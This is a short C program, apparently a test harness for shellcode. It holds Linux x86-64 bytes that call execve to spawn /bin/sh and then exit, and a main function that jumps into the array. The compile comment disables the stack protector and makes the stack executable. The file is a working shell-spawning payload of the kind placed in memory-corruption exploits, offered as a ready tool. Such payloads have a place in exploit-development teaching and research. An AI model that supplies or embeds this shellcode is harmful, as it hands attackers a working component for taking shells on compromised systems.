//compile : gcc execute_final_shellcode.c -o execute_final_shellcode -fno-stack-protector -z execstack
// This Script Test Your Opcode for Linux x86-64
char code[] = "\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05";

int main(int argc,char **argv)
{
    int (*func)();
    func = (int (*)()) code;
    (int)(*func)();
    return 0;
}